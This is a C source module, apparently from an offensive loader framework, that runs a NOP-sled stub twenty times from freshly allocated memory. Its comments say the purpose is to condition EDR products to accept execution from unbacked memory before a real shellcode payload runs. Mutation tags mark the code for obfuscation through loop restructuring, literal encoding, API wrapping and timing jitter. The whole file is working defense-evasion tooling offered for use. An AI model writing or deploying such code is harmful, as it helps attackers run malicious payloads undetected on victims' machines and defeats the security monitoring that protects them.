/* MODULE: DECONDITIONER
 * TYPE: alloc_exec
 * DESC: Full carrier rehearsal — Alloc(RW) → Write benign code → Protect(RX)
 *       → EXECUTE → Free. Goes beyond alloc_loop by actually running code from
 *       the RX region (a NOP sled ending in RET). This normalizes execution from
 *       unbacked memory, which is the #1 EDR detection signal for shellcode.
 *
 *       Expected effect: the EDR has already seen this process execute from
 *       dynamically allocated memory DECON_ROUNDS times before the real payload
 *       runs, reducing the anomaly score of that behavior.
 *
 * MUTATIONS: loop_mutation, literal_encoding, loop_restructuring, timing_jitter
 */
#include "../header/definitions.h"

#ifndef DECON_ROUNDS
#define DECON_ROUNDS 20
#endif

void deconditioner() {
    DWORD old_prot;

    // @MUTATE:loop_mutation(fixed->GetTickCount_modulo)
    // @MUTATE:loop_restructuring(for->while|unroll)
    for (int i = 0; i < DECON_ROUNDS; i++) {

        // @MUTATE:api_wrapper_injection(VirtualAlloc)
        // @MUTATE:literal_encoding
        char *buf = (char*)VirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);
        if (!buf) continue;

        // Write a benign NOP sled (0x90) ending with RET (0xC3)
        // This is valid x86-64 code that does nothing and returns
        // @MUTATE:literal_encoding
        for (int k = 0; k < PAYLOAD_LEN - 1; k++) {
            buf[k] = (char)0x90;  // NOP
        }
        buf[PAYLOAD_LEN - 1] = (char)0xC3;  // RET

        // @MUTATE:timing_jitter
        // @MUTATE:api_wrapper_injection(VirtualProtect)
        if (!VirtualProtect(buf, PAYLOAD_LEN, p_RX, &old_prot)) {
            VirtualFree(buf, 0, 0x8000);
            continue;
        }

        // Execute — this is what makes deconditioning effective.
        // The EDR sees code running from VirtualAlloc'd memory and (hopefully)
        // learns that this process legitimately does this.
        // @MUTATE:execution_method(direct|callback)
        ((void(*)())buf)();

        // @MUTATE:timing_jitter
        // @MUTATE:literal_encoding
        VirtualFree(buf, 0, 0x8000);
    }
}
